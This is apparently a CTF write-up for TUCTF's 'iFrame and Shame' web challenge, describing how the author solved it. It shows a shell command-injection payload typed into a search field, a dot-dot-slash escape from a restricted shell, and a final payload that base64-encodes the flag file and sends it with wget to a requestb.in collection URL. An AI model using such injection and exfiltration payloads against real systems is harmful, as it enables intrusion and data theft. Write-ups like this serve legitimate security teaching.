## iFrame and Shame (Web, 300pt)

> I overheard some guys bragging about how they have a custom Youtube search bar on their site. Put them to shame.
> 
> Note: The input from the search bar should be passed to a script that queries youtube using "youtube.com/results?search_query=[your query]". Then it will put it in an iframe. You are only seeing the one video because it is the default upon error.
> NOTE: iFrame and Shame's search bar is supposed to query Youtube, but it doesn't behave as intended because we didn't consider that Youtube limits queries. The challenge is still solvable.
>
> http://iframeshame.tuctf.com

The challenge gives us only an input box through which we can query YouTube. After fuzzing for SQLi and command injection I was able to execute commands on the server (receive output) using the following payload:

```
"; echo rce #
```

However, after poking a bit with the server and not being able to find the flag file, I realized that something fishy was going on. Not all my commands returned output so I tried to `cat /etc/passwd` and found out that the `chal` user was running in `/bin/rbash`.

I used `dot-dot-slash` to escape it and searched for the flag file using the following command:

```
../../../../../../find ../../../../../../ -type -f -name flag
```

The server responsed:

```
HTTP/1.1 200 OK
Date: Sat, 25 Nov 2017 00:17:08 GMT
Server: Apache/2.4.10 (Debian)
Vary: Accept-Encoding
Content-Length: 286
Connection: close
Content-Type: text/html; charset=UTF-8


<form name="searchform" method="POST" action="">
    <input id="search" type="text" name="search"/>
    <input type="submit" name="Submit"/>
</form>

<iframe width="560" height="315" src="../../../../../../home/chal/iFrame-and-Shame/flag?autoplay=1" frameborder="0" allowfullscreen></iframe>
```

Initially, I tried to cat the flag but not all content was returned. I also tried to base64 it or hexdump it, but still not luck. So, I decided to encode it and send it to requestb.in!

```
wget https://requestb.in/XXXXXXXX?x=$(base64 /home/chal/iFrame-and-Shame/flag)
```

The final payload looked like this:

```
"; ../../../../../../usr/bin/wget https://requestb.in/1k2lrzs1?x=$(../../../../../../usr/bin/base64 ../../../../../../home/chal/iFrame-and-Shame/flag) #
```

```
# TUCTF{D0nt_Th1nk_H4x0r$_C4nt_3sc4p3_Y0ur_Pr0t3ct10ns}
```
